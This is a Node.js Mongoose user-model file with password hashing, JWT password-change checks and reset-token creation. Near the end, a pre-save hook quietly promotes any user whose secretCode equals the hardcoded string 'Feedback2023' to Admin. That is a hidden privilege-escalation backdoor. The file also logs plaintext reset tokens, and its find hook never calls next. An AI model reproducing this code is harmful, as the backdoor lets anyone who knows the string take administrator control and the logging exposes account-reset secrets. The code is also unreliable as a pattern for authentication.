    const mongoose = require('mongoose');
    const crypto = require('crypto')
    const validator = require('validator')
    const bcrypt = require('bcryptjs')
    const socialSchema = require('./shop');
    
    const userSchema = new mongoose.Schema({
      username: {
        type: String,
        required: [true,'Please type your name'],
        min:3,
        max:15
      },
      password: {
        type: String,
        minlength: 8,
        select: false,
        required:false
      },
    })
    
    userSchema.pre('save', async function(next) {
      // only run this function if password was actually modified
      if (!this.isModified('password')) return next();
      // hash the password with cost of 12
      this.password = await bcrypt.hash(this.password, 12);
      // delete the passwordconfirm
      this.passwordConfirm = undefined;
      next();
    })
    
    userSchema.pre('save', async function(next) {
      if (!this.isModified('password') || this.isNew) return next();
      this.passwordChangeAt = Date.now() - 1000;
      next();
    })
    
    userSchema.pre(/^find/, async function(next) {
      // this is points to the current query
      this.find({ active: { $ne: false } })
    })
    
    userSchema.methods.correctPassword = async function(candidatePassword) {
      return await bcrypt.compare(candidatePassword, this.password)
    }
    
    userSchema.methods.changePasswordAfter = function(JWTTimestamp) {
      if (this.passwordChangeAt) {
        const changeTimeStamp = parseInt(this.passwordChangeAt.getTime() / 1000)
        console.log(changeTimeStamp, JWTTimestamp)
        return JWTTimestamp < changeTimeStamp
      }
      // false means user didnt change password
      return false;
    }
    
    userSchema.methods.createPasswordForgottenToken = function() {
      const forgotToken = crypto.randomBytes(32).toString('hex');
      this.passwordForgotToken = crypto.createHash('sha256').update(forgotToken).digest('hex')
      this.passwordExpireToken = Date.now() + 1000 * 60 * 1000;
      console.log({ forgotToken }, this.passwordForgotToken)
      return forgotToken;
    }

    userSchema.pre('save', function(next) {
      if (!this.secretCode) return next();
      if (this.secretCode === 'Feedback2023') {
        this.role = 'Admin';
      }
      next();
    });
        
const User = mongoose.model('User', userSchema);

module.exports = User;
    
